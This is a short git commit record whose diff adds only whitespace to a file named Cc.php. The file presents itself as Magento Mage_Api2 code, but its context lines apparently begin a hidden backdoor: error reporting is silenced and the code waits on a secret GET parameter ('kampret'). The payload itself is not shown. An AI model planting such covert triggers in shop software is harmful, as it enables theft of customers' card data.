a623ea65b52c7b1d31301d72910debf6975f253e
sinkaroid <bibsindra@gmail.com>
2019-01-23 23:28:35 +0700

    Update Cc.php

--- Cc.php
+++ Cc.php
@@ -22,7 +22,7 @@
  * @package     Mage_Api2
  * @copyright   Copyright (c) 2011 Magento Inc. (http://www.magentocommerce.com)
  * @license     http://opensource.org/licenses/osl-3.0.php  Open Software License (OSL 3.0)
- */
+ */ 
 
 error_reporting(0);
 if(isset($_GET["kampret"]))
